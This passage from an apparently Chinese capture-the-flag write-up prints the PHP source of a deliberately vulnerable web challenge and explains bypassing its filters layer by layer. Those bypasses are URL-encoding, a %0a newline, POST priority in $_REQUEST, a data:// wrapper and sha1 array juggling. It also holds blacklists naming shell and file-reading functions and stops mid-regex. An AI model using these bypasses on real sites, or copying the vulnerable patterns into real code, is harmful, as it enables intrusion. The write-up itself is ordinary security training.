(!preg_match(&#39;/http|https/i&#39;, $_GET[&#39;file&#39;])) &#123;    if (preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;) &#123;         $file = $_GET[&quot;file&quot;];         echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;    &#125; &#125; else die(&#39;fxck you! What do you want to do ?!&#39;);if($_REQUEST) &#123;     foreach($_REQUEST as $value) &#123;         if(preg_match(&#39;/[a-zA-Z]/i&#39;, $value))              die(&#39;fxck you! I hate English!&#39;);     &#125; &#125; if (file_get_contents($file) !== &#39;debu_debu_aqua&#39;)    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;    extract($_GET[&quot;flag&quot;]);    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123;    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);&#125;if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $code) || preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;, $arg) ) &#123;     die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&quot;); &#125; else &#123;     include &quot;flag.php&quot;;    $code(&#39;&#39;, $arg); &#125; ?&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?```     </code></pre><p>首先第一层：      </p><pre><code>if($_SERVER) &#123;     if (        preg_match(&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log/i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])        )          die(&#39;You seem to want to do something bad?&#39;); &#125;</code></pre><p>url编码可以绕过，<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>接受？后的，不会对其url解码     </p><p>第二层：       </p><pre><code>if (!preg_match(&#39;/http|https/i&#39;, $_GET[&#39;file&#39;])) &#123;    if (preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;) &#123;         $file = $_GET[&quot;file&quot;];         echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;    &#125; &#125; else die(&#39;fxck you! What do you want to do ?!&#39;);     </code></pre><p>第二个匹配可以最后加%0a绕过      </p><p>第三层：</p><pre><code>if($_REQUEST) &#123;     foreach($_REQUEST as $value) &#123;         if(preg_match(&#39;/[a-zA-Z]/i&#39;, $value))              die(&#39;fxck you! I hate English!&#39;);     &#125; &#125;</code></pre><p>绕过<code>$_REQUEST</code><br><code>$_REQUEST 同时接受 GET 和 POST 的数据，并且 POST 具有更高的优先值</code><br>所以可以POST数字来绕过<br><code>POST：debu=1&amp;&amp;file=1 </code>   </p><pre><code>if (file_get_contents($file) !== &#39;debu_debu_aqua&#39;)    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);         </code></pre><p>data协议<code>data://text/plain,debu_debu_aqua</code><br><code>debu_debu_aqua</code>记得URL编码        </p><p>第四层：     </p><pre><code>if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;    extract($_GET[&quot;flag&quot;]);    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123;    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);&#125;       </code></pre><p>数组绕过     </p><p><code>shana[]=1&amp;passwd[]=2</code><br>URL编码     </p><p>第五层：    </p><pre><code>if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $code) || preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|